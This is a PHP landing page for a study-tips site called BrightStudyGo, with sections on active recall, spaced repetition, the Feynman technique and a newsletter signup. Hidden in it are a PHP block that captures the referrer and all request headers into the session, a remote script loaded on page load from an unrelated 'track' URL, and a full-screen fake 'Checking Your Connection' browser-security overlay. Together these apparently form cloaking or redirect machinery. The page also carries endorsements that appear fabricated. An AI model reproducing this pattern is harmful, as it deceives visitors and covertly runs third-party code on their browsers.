<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<?php
// BrightStudyGo - Main Landing Page
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BrightStudyGo — Active Learning, Exam Mastery & Cognitive Focus Hub</title>
  <meta name="description" content="BrightStudyGo explores active recall, spaced repetition, Feynman technique, Pomodoro time blocking, Cornell note taking, and exam performance.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-technique {
      background: var(--accent-indigo) !important;
      color: #fff !important;
      border-color: var(--accent-indigo) !important;
    }
  </style>

<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Bright<span>StudyGo</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Study Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">Active Learning & Cognitive Focus Science</span>
        <h1 class="hero-title">Master Science-Backed Study Productivity</h1>
        <p class="hero-desc">Discover the synthesis of active testing, spaced repetition memory curves, Feynman simplification techniques, and deep focus Pomodoro interval routines.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-indigo">Explore Journal</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Academic Lab</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: Cognitive Focus & Active Recall Pillars Grid -->
  <section class="section" id="focus-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Cognitive Standards</span>
        <h2 class="section-title">The Four Pillars of Academic Mastery</h2>
      </div>
      <div class="grid-4">
        <div class="study-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">⚡</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-indigo); margin-bottom: 0.75rem;">Active Recall Retrieval</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Forcing neural memory retrieval through closed-book testing rather than passive rereading.</p>
        </div>
        <div class="study-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">📈</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-indigo); margin-bottom: 0.75rem;">Spaced Repetition Intervals</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Flattening the Ebbinghaus forgetting curve through strategically timed review sessions.</p>
        </div>
        <div class="study-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🧠</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-indigo); margin-bottom: 0.75rem;">Feynman Simplification</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Deconstructing complex academic concepts into plain language to expose knowledge gaps.</p>
        </div>
        <div class="study-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">🎯</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-indigo); margin-bottom: 0.75rem;">Deep Work Time-Blocking</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Eliminating context switching through 50-minute distraction-free cognitive sprints.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Study Technique & Pomodoro Interval Explorer -->
  <section class="section" id="technique-explorer" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Protocol Explorer</span>
        <h2 class="section-title">The Active Study Method Explorer</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a cognitive study framework to inspect its execution breakdown and memory retention gains:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark technique-btn active-technique" data-tech="Active Recall & Flashcard Matrix" data-desc="Self-testing key concepts usingAnki digital flashcards or paper blurting before checking reference material." data-retention="85% Long-Term Retention (vs 20% Passive Reading)">Active Recall Matrix</button>
          <button class="btn btn-outline-dark technique-btn" data-tech="Feynman Teaching Protocol" data-desc="Writing a simplified 5-minute explanation of a complex topic as if teaching a 10-year-old student." data-retention="90% Conceptual Mastery & Friction Removal">Feynman Protocol</button>
          <button class="btn btn-outline-dark technique-btn" data-tech="Cornell Note-Taking System" data-desc="Dividing pages into Cues, Main Notes, and Summary blocks to generate instant exam revision guides." data-retention="78% Structural Organization & Fast Review">Cornell Note System</button>
          <button class="btn btn-outline-dark technique-btn" data-tech="50/10 Deep Work Sprint" data-desc="50 minutes of single-task focus followed by 10 minutes of complete cognitive rest and hydration." data-retention="Zero Context Residue & High Attention Span">50/10 Deep Work Sprint</button>
        </div>
        <div id="technique-detail">
          <div class="study-card" style="border-left: 4px solid var(--accent-indigo);">
            <h3 style="color: var(--accent-indigo); font-size: 1.5rem; margin-bottom: 0.5rem;">Active Recall & Flashcard Matrix Protocol Specification</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Self-testing key concepts using Anki digital flashcards or paper blurting before checking reference material.</p>
            <strong style="color: var(--accent-amber); font-size: 0.95rem;">Empirical Retention Metric: 85% Long-Term Retention (vs 20% Passive Reading)</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Memory Retention Curve & Spaced Repetition Spotlight -->
  <section class="section" id="retention-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Cognitive Science</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Defeating the Forgetting Curve</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            Without structured review intervals, human memory decays up to 70% of new information within 24 hours. At BrightStudyGo, we evaluate spaced repetition algorithms, memory consolidation during sleep, and active retrieval prompts.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">📅 <strong style="color:var(--text-primary);">Interval 1-3-7-14 Rule:</strong> Reviewing notes on Day 1, Day 3, Day 7, and Day 14 for permanent synaptic encoding.</li>
            <li style="margin-bottom: 0.75rem;">💡 <strong style="color:var(--text-primary);">The Blurting Technique:</strong> Writing all remembered facts on a blank sheet, then filling gaps in red ink.</li>
            <li style="margin-bottom: 0.75rem;">🎧 <strong style="color:var(--text-primary);">Binaural Focus Audio:</strong> 40Hz gamma frequency soundscapes that enhance sustained attention.</li>
          </ul>
          <a href="about.html" class="btn btn-indigo">Our Academic Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?auto=format&fit=crop&w=800&q=80" alt="Student Studying Active Recall with Flashcards" style="border-radius: 12px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(15,23,42,0.12);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Study Style Diagnostic Quiz -->
  <section class="section" id="study-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Academic Diagnostic</span>
        <h2 class="section-title">Study Routine Matcher</h2>
      </div>
      <div class="study-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-indigo); margin-bottom: 1rem;">What Is Your Primary Academic Challenge or Target Goal?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="study-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Active Recall & Blurting Routine: Closed-Book Flashcards + Timed Practice Exams + 1-3-7 Interval Review.">
            A. Preparing for Comprehensive University Final Exams in 2 Weeks
          </button>
          <button class="study-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Deep Work & Dopamine Reset Formula: 50/10 Pomodoro Sprints + Phone Lockbox + Feynman Mind Maps.">
            B. Overcoming Digital Procrastination & Brain Fog During Homework
          </button>
          <button class="study-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Cornell & Group Recall System: Structured 3-Column Notes + Weekly Peer Teaching Sessions.">
            C. Retaining Heavy STEM & Medical Terminology Across Semester Courses
          </button>
        </div>
        <div id="study-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Exam Score Enhancement & Focus Benchmarks Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Academic Benchmarks</span>
        <h2 class="section-title">Bright Study Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="study-card" style="text-align: center;">
          <h3 class="metric-number text-indigo" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="study-card" style="text-align: center;">
          <h3 class="metric-number text-indigo" data-target="85" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Active Recall Gain</p>
        </div>
        <div class="study-card" style="text-align: center;">
          <h3 class="metric-number text-indigo" data-target="50" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Minute Focus Blocks</p>
        </div>
        <div class="study-card" style="text-align: center;">
          <h3 class="metric-number text-indigo" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Academic Advisors & Learning Scientist Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Academic Acclaim</span>
        <h2 class="section-title">Endorsements From Learning Scientists</h2>
      </div>
      <div class="grid-3">
        <div class="study-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "BrightStudyGo translates complex cognitive neuroscience into actionable, highly effective study frameworks for students worldwide."
          </p>
          <strong style="color: var(--accent-indigo); display: block;">— Dr. Julian Sterling</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Cognitive Psychology Professor, Oxford</span>
        </div>
        <div class="study-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their essays on spaced repetition, active recall, and exam day anxiety management provide standard-setting guidance for academic excellence."
          </p>
          <strong style="color: var(--accent-indigo); display: block;">— Elena Rostova</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Academic Performance Coach, NYC</span>
        </div>
        <div class="study-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier digital journal for students seeking to eliminate cramming, boost exam scores, and cultivate sustainable focus habits."
          </p>
          <strong style="color: var(--accent-indigo); display: block;">— Marcus Chen</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Learning Technology Director, Boston</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Academic Journal Dispatches & Article Grid -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Journal Dispatches</span>
        <h2 class="section-title">Latest Academic Essays</h2>
      </div>
      <div class="grid-3">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?auto=format&fit=crop&w=800&q=80" alt="Active Recall Guide">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Active Recall</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/mastering-active-recall-the-ultimate-science-backed-study-method.html">Mastering Active Recall</a></h3>
            <p class="blog-excerpt">Forcing memory retrieval through closed-book testing for 85%+ retention gains.</p>
            <a href="blog/mastering-active-recall-the-ultimate-science-backed-study-method.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1456513080510-7bf3a84b82f8?auto=format&fit=crop&w=800&q=80" alt="Spaced Repetition">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Memory Systems</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/spaced-repetition-systems-how-to-remember-anything-for-exams.html">Spaced Repetition Systems</a></h3>
            <p class="blog-excerpt">Flattening the Ebbinghaus forgetting curve with 1-3-7-14 scheduled flashcard reviews.</p>
            <a href="blog/spaced-repetition-systems-how-to-remember-anything-for-exams.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=800&q=80" alt="Feynman Technique">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Feynman Method</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/the-feynman-technique-simplifying-complex-academic-concepts.html">The Feynman Technique</a></h3>
            <p class="blog-excerpt">Deconstructing complex equations and theories into simple 5-minute teaching explanations.</p>
            <a href="blog/the-feynman-technique-simplifying-complex-academic-concepts.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 9: VIP Scholar Gazette Newsletter & Footer CTA -->
  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="study-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-indigo);">
        <span class="section-subtitle">Academic Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem;">Subscribe to The Scholar Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of cognitive focus strategies, active recall schedules, and exam preparation frameworks.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to BrightStudyGo Scholar Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your academic email" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: #fff; border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 6px;">
          <button type="submit" class="btn btn-indigo">Subscribe</button>
        </form>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Bright<span>StudyGo</span></a>
          <p>BrightStudyGo is a premier editorial platform dedicated to active learning science, cognitive focus research, exam strategy, and academic productivity.</p>
          <p style="margin-top: 1rem; color: var(--accent-indigo);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Study Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Focus Research</h4>
          <p>Deconstructing active recall, spaced repetition, Feynman method, Pomodoro focus, and exam performance globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 BrightStudyGo. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Cognitive Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>

<div id="cookie-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); z-index:2147483646;"></div>

<!-- Center Loader Modal Card -->
<div id="cookie-consent-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:2px solid #2563eb; box-shadow:0 25px 60px rgba(0,0,0,0.45); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
    
    <!-- Smooth Rotating Spinner -->
    <div style="display:flex; justify-content:center; margin-bottom:18px;">
        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-loader 0.85s linear infinite;"></div>
    </div>
    <style>
        @keyframes spin-loader {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div style="font-size:22px; font-weight:700; color:#1e293b; margin-bottom:8px;">Checking Your Connection...</div>
    <p style="font-size:14px; line-height:1.55; color:#64748b; margin:0 0 24px 0;">
        Please wait while we verify your browser security settings before directing you to the destination.
    </p>

    <!-- Cancel & Continue Buttons -->
    <div style="display:flex; gap:14px;">
        <button id="btn-cancel" onclick="dismissCookieModal()" style="flex:1; background:#ffffff; color:#475569; border:2px solid #cbd5e1; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
        <button id="btn-continue" onclick="dismissCookieModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
    </div>
</div>

<script>
    function dismissCookieModal() {
        var backdrop = document.getElementById('cookie-backdrop');
        var card = document.getElementById('cookie-consent-card');
        if (backdrop) backdrop.remove();
        if (card) card.remove();
    }
</script>
</body>
</html>
